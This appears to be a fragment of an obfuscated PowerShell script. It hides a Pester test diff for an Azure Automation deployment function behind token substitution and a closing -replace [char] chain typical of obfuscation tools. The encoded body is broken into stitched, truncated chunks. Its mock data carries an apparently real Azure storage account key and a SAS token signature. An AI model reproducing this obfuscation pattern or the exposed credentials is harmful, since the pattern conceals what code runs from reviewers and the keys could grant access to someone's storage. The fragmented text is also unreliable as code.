+            E03AbstractSyntaxTree = [System.Management.Automation.Language.Parser]::
+            ParseInput((Get-Content -raw E03sutPath), [ref]E03null, [ref]E03null)
+            E03AstSearchDelegate = { E03args[0] -is [System.Management.Automation.Language.ScriptBlockAst] }
+            E03parsedScript = E03AbstractSyntaxTree.FindAll( E03AstSearchDelegate, E03true ) # LUK Where-Object Name -eq E03functionName
+            E03scriptHelp = E03parsedScript.GetHelpContent()
+
+            It K5Pshould have a SYNOPSISK5P {
+                E03scriptHelp.Synopsis LUK Should Not BeNullOrEmpty
+            }
+
+            It K5Pshould have a DESCRIPTIONK5P {
+                E03scriptHelp.Description.Length LUK Should Not BeNullOrEmpty
+            }
+
+            It K5Pshould have at least one EXAMPLEK5P {
+                E03scriptHelp.Examples.Count LUK Should BeGreaterThan 0
+            }
+
+            # Getting the list of function parameters
+            <# E03parameters = E03parsedScript.ParamBlock.Parameters.name.VariablePath.Foreach{ E03_.ToString() }
+
+            foreach (E03parameter in E03parameters) {
+                It K5Pshould have descriptive help for 5hFE03parameter5hF parameterK5P {
+                    E03scriptHelp.Parameters.(E03parameter.ToUpper()) LUK Should Not BeNullOrEmpty
+                }
+            } #>
+        }
+
+        Context 5hFScript Logic - Public Module5hF {
+
+            Mock Get-AzAutomationAccount {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp:/','>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:42:32.617Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:42:32.617+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>17</I32>
+            <I32 N=K5PMillisecondK5P>617</I32>
+            <I32 N=K5PMinuteK5P>42</I32>
+   ','y 1 -Scope It
+                    Assert-MockCalled Get-AzStorageContainer -Exactly 1 -Scope It
+                    Assert-MockCalled Get-AzStorageAccountKey -Exactly 1 -Scope It
+                    Assert-MockCalled New-AzStorageContainer -Exactly 0 -Scope It
+                    Assert-MockCalled New-AzStorageContext -Exactly 1 -Scope It
+                    Assert-MockCalled New-AzStorageBlobSASToken -Exactly 1 -Scope It
+                    Assert-MockCalled Set-AzStorageBlobContent -Exactly 1 -Scope It
+                }
+            }
+        }
+
+        Context 5hFScript Logic - Source Module5hF {
+
+            Mock Get-AzAutomationAccount {
+    ','           </TN>
+            <ToString>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https</ToString>
+            <Props>
+            <URI N=K5PTableEndpointK5P>https://aadeploymentstor.table.core.windows.net/</URI>
+            <S N=K5PTableStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.table.core.windows.net/5hF; Secondary = 5hF5hF</S>
+            <S N=K5PCredentialsK5P>Microsoft.Azure.Cosmos.Table.StorageCredentials</S>
+            </Props>
+        </Obj>
+        <Nil N=K5PTrack2OauthTokenK5P />
+        <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+        <S N=K5PConnectionStringK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;AccountName=aadeploymentstor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+        <Ref N=K5PExtendedPropertiesK5P RefId=K5P2K5P />
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock New-AzStorageBlobSASToken {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <S>https://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip?sv=2019-02-02&amp;sr=b&amp;sig=if5HREXrRThQDVCvfCQI3ukJTvGtsJvQMNB6nkBkX4E%3D&amp;se=2020-05-12T12%3A30%3A57Z&amp;sp=r</S>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock Set-AzStorageBlobContent {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageBlob</T>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageBase</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageBlob</ToString>
+        <Props>
+ ','queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https;AccountName=aadeploymentstor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+            <Obj N=K5PExtendedPropertiesK5P RefId=K5P11K5P>
+                <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <S N=K5PNameK5P>psdepend</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock New-AzStorageContext {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</ToString>
+        <Props>
+        <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+        <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+        <S N=K5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+        <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+        <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+        <Obj N=K5PContextK5P RefId=K5P1K5P>
+            <TNRef RefId=K5P0K5P />
+            <ToString>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</ToString>
+            <Props>
+            <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <Ref N=K5PContextK5P RefId=K5P1K5P />
+            <S N=K5PNameK5P></S>
+            <S N=K5PStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableE','spaceK5P />
+        <S N=K5PLargeFileSharesStateK5P>Disabled</S>
+        <Obj N=K5PNetworkRuleSetK5P RefId=K5P8K5P>
+            <TN RefId=K5P8K5P>
+            <T>Microsoft.Azure.Commands.Management.Storage.Models.PSNetworkRuleSet</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Commands.Management.Storage.Models.PSNetworkRuleSet</ToString>
+            <Props>
+            <Obj N=K5PIpRulesK5P RefId=K5P9K5P>
+                <TN RefId=K5P9K5P>
+                <T>Microsoft.Azure.Commands.Management.Storage.Models.PSIpRule[]</T>
+                <T>System.Array</T>
+                <T>System.Object</T>
+                </TN>
+                <LST />
+       ','deploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/;DefaultEndpointsProtocol=https</S>
+            <Nil N=K5PTrack2OauthTokenK5P />
+            <S N=K5PEndPointSuffixK5P>core.windows.net/</S>
+            <S N=K5PConnectionStringK5P>BlobEndpoint=https://aadepl','StringK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEndpoint=https://aadeploymentstor.queue.core.windows.net/;TableEndpoint=https://aadeploymentstor.table.core.windows.net/;FileEndpoint=https://aadeploymentstor.file.core.windows.net/',';AccountName=aadeploymentstor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+            <Obj N=K5PExtendedPropertiesK5P RefId=K5P12K5P>
+                <TNRef RefId=K5P7K5P />
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <Obj N=K5PExtendedPropertiesK5P RefId=K5P13K5P>
+            <TNRef RefId=K5P7K5P />
+            <DCT />
+        </Obj>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock Get-AzStorageContainer {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageContainer</T>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageBase</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageContainer</ToString>
+        <Props>
+        <Obj N=K5PCloudBlobContainerK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>Microsoft.Azure.Storage.Blob.CloudBlobContainer</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Storage.Blob.CloudBlobContainer</ToString>
+            <Props>
+            <S N=K5PServiceClientK5P>Microsoft.Azure.Storage.Blob.CloudBlobClient</S>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend</URI>
+            <S N=K5PStorageUriK5P>Prima','T>
+            <T>System.Object</T>
+            </TN>
+            <ToStr','fWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>275</I32>
+            <I32 N=K5PHourK5P>16</I32>
+            <I32 N=K5PMillisecondK5P>390</I32>
+            <I32 N=K5PMinuteK5P>5</I32>
+            <I32 N=K5PMonthK5P>10</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>15</I32>
+            <I64 N=K5PTicksK5P>636425571153900000</I64>
+            <I64 N=K5PUtcTicksK5P>636425463153900000</I64>
+            <TS N=K5PTimeOfDayK5P>PT16H5M15.39S</TS>
+            <I32 N=K5PYearK5P>2017</I32>
+            </Props>
+        </Obj>
+        <Obj N=K5PLastModifiedTimeK5P RefId=K5P2K5P>
+            <TNRef RefId=K5P1K5P />
+            <ToString>03/22/2020 10:41:20 +02:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-03-22T10:41:20.57</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-03-22T08:41:20.57Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-03-22T10:41:20.57+02:00</DT>
+            <DT N=K5PDateK5P>2020-03-22T00:00:00</DT>
+            <I32 N=K5PDayK5P>22</I32>
+            <S N=K5PDayOfWeekK5P>Sunday</S>
+            <I32 N=K5PDayOfYearK5P>82</I32>
+            <I32 N=K5PHourK5P>10</I32>
+      ','      }
+            Mock New-AzStorageContainer {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageContainer</T>
+        <T>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageBase</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.WindowsAzure.Commands.Common.Storage.ResourceModel.AzureStorageContainer</ToString>
+        <Props>
+        <Obj N=K5PCloudBlobContainerK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>Microsoft.Azure.Storage.Blob.CloudBlobContainer</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Storage.Blob.CloudBlobContainer</ToString>
+            <Props>
+            <S N=K5PServiceClientK5P>Microsoft.Azure.Storage.Blob.CloudBlobClient</S>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend</URI>
+            <S N=K5PStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.blob.core.windows.net/psdepend5hF; Secondary = 5hF5hF</S>
+            <S N=K5PNameK5P>psdepend</S>
+            <Obj N=K5PMetadataK5P RefId=K')) -rePlaCE ([CHaR]76+[CHaR]85+[CHaR]75),[CHaR]124  -rePlaCE  ([CHaR]53+[CHaR]104+[CHaR]70),[CHaR]39 -CrEplacE 'egC',[CHaR]92 -CrEplacE  ([CHaR]69+[CHaR]48+[CHaR]51),[CHaR]36-rePlaCE  'K5P',[CHaR]34 -rePlaCE'e3A',[CHaR]96) )
